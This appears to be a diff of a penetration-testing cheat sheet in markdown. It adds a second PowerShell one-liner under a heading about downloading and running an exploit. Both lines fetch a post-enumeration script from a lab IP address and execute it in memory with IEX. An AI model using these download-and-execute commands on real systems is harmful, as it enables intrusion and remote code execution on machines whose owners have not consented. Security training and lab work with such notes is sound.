@@ -14,9 +14,10 @@ sudo vmhgfs-fuse .host:/ /mnt/hgfs/ -o allow_other -o uid=1000
 
 <summary>Downloading &#x26; Running Exploit Using Powershell</summary>
 
-```powershell
-powershell -c "$r = iwr http://192.168.45.203/post_enum.ps1 -UseBasicParsing; $s = (New-Object System.IO.StreamReader($r.RawContentStream)).ReadToEnd(); iex $s"
-```
+<pre class="language-powershell"><code class="lang-powershell">powershell -c "(new-object system.net.webclient).downloadstring('http://192.168.45.203/post_enum.ps1') | IEX
+
+<strong>powershell -c "$r = iwr http://192.168.45.203/post_enum.ps1 -UseBasicParsing; $s = (New-Object System.IO.StreamReader($r.RawContentStream)).ReadToEnd(); iex $s"
+</strong></code></pre>
 
 </details>
 
@@ -46,7 +47,7 @@ OR
 
 <details>
 
-<summary>SSH </summary>
+<summary>SSH</summary>
 
 ### SSH with specified private key
 
